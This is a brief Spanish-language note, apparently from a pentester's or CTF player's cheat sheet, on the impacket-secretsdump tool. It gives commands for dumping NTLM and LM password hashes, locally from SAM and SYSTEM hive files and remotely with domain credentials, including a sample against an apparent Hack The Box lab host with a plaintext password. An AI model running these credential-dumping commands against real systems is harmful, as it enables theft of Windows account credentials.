#impacket-secretsdump

-----

Extrae credenciales de sistemas Windows volcando hashes de contraseñas de New Technology LAN Manager (NTLM) y LAN Manager (LM), incluso desde la memoria o los subárboles del registro, lo que ayuda al robo de credenciales.

-----
# Comando

## Ejemplo 1

```shell
impacket-secretsdump -sam sam -system system LOCAL
Ejemplo impacket-secretsdump -sam sam -system system LOCAL
```
*Parametros:*
	`-sam` Es para especificar el formato del archivo
	`system` Es para indicar el archivo system que tiene la encriptacion
	LOCAL` Es para indicar que es a nivel local

## Ejemplo 2

```shell
secretsdump.py 'Dominio'/'Usuario':'Contraseña'@'Host'
Ejemplo:secretsdump.py 'administrator.htb'/'ethan':'limpbizkit'@'administrator.htb'
```
